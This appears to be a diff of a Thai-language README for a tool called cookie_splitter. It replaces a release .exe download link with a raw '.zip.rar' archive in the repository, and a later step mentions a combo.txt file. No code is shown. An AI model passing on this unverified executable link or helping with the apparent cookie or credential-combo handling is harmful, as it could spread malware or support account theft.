@@ -13,7 +13,8 @@
 
 ### 1. 📥 ดาวน์โหลดไฟล์
 
-[![ดาวน์โหลด](https://img.shields.io/badge/Download-cookie__splitter.exe-blue?style=for-the-badge&logo=github)](https://github.com/pacharasesangngam/cookie_splitter/releases/download/v1.0/cookie_splitter.exe)
+[![Download](https://img.shields.io/badge/Download-cookie__splitter-blue?style=for-the-badge&logo=github)](https://github.com/pacharasesangngam/cookie_splitter/raw/main/cookie_splitter_v1.0.zip.rar)
+
 
 
 ### 2. 📂 สร้างไฟล์ `combo.txt`
